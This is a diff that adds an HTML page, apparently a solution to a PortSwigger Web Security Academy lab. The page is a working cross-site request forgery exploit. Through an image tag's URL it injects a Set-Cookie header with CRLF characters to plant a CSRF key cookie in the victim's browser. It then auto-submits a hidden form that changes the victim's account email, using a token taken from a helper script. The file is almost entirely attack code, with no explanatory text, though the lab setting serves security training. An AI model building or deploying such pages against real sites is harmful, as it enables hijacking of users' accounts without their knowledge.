@@ -1,0 +1,31 @@
+<html>
+  <form
+    id="csrf-form"
+    enctype="application/x-www-form-urlencoded"
+    method="POST"
+    action="https://0afa0058044ffc36c01e092b006100bb.web-security-academy.net/my-account/change-email"
+  >
+  <!-- to set the victim cookie -->
+  <!-- substitute csrfKey=<value from csrfKey of lab05.py result-->
+  <img src="https://0afa0058044ffc36c01e092b006100bb.web-security-academy.net/?search=abc%0d%0aSet-Cookie:%20csrfKey=WkE6JWT1tTXsu0La14ks3Ehbd7MMdGc0%3b%20SameSite=None" onerror="document.forms[0].submit()">
+
+    <table>
+      <tr>
+        <td>email</td>
+        <td><input type="text" value="test@test2.com" name="email" /></td>
+      </tr>
+      <tr>
+        <td>csrf</td>
+        <!-- substitute csrf value from lab05.py result -->
+        <td><input type="text" value="Qh6iuPuUPqBUfwV7FmLiBnjkYiq4JWdj" name="csrf" /></td>
+      </tr>
+    </table>
+    <input
+      type="submit"
+      value="https://0afa0058044ffc36c01e092b006100bb.web-security-academy.net/my-account/change-email"
+    />
+  </form>
+  <script>
+    document.getElementById("csrf-form").submit();
+  </script>
+</html>
